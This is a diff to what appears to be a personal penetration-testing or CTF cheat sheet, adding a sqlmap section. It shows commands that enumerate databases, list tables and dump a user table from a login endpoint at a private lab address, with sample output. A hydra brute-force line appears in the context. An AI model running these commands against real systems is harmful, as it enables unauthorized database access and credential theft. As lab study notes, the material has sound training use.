@@ -627,6 +627,44 @@ hydra <username> <wordlist> 10.65.178.189 http-post-form "<path>:<login_credenti
 </details>
 
 <details>
+<summary style="cursor:pointer">sqlmap</summary>
+
+For reverse_shell payloads etc.
+```
+SCHOW DATABASES
+sqlmap -u 'http://10.113.166.38/ai/includes/user_login?email=a&password=a' --dbs
+
+available databases [6]:
+[*] ai
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+
+```
+```
+SHOW TABLES
+sqlmap -u 'http://10.113.166.38/ai/includes/user_login?email=a&password=a' -D ai --tables
+
+Database: ai
+[1 table]
++------+
+| user |
++------+
+
+```
+```
+SHOW INSIDE TABLE
+sqlmap -u 'http://10.113.166.38/ai/includes/user_login?email=a&password=a' -D ai -T user --dump
+
+[21:05:47] [INFO] retrieved: 12345678
+[21:06:34] [INFO] retrieved: 2023-02-21
+```
+  
+</details>
+
+<details>
 <summary style="cursor:pointer">gobuster</summary>
 dns mode: enumerates dns subdomains.  
 dir mode: enumerates directories.  
